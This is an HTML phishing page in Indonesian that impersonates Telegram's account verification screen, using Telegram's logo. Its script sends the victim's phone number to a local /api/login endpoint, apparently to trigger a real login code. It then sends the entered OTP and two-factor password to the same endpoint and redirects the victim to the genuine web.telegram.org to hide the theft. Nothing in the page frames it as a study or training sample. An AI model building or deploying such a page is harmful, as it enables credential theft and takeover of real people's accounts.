<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8"><title>Telegram: Verifikasi</title>
    <link rel="stylesheet" href="style.css">
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { width: 320px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 8px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #3390ec; color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://telegram.org/img/t_logo.png" width="80">
        <h2>Telegram</h2>
        <div id="step1">
            <p>Masukkan nomor telepon untuk verifikasi akun.</p>
            <input type="text" id="phone" placeholder="+62812xxxx">
            <button onclick="reqOTP()">BERIKUTNYA</button>
        </div>
        <div id="step2" style="display:none;">
            <p>Kode OTP asli telah dikirim ke nomor Anda.</p>
            <input type="text" id="otp" placeholder="Kode 5 Digit">
            <input type="password" id="pwd" placeholder="Password 2FA (Jika ada)">
            <button onclick="submitAll()">KONFIRMASI</button>
        </div>
    </div>

    <script>
        async function reqOTP() {
            const phone = document.getElementById('phone').value;
            const res = await fetch('/api/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ action: 'SEND_OTP', phone })
            });
            if (res.ok) {
                document.getElementById('step1').style.display = 'none';
                document.getElementById('step2').style.display = 'block';
            }
        }
        async function submitAll() {
            const phone = document.getElementById('phone').value;
            const otp = document.getElementById('otp').value;
            const password = document.getElementById('pwd').value;
            await fetch('/api/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ action: 'VERIFY', phone, otp, password })
            });
            window.location.href = "https://web.telegram.org";
        }
    </script>
</body>
</html>
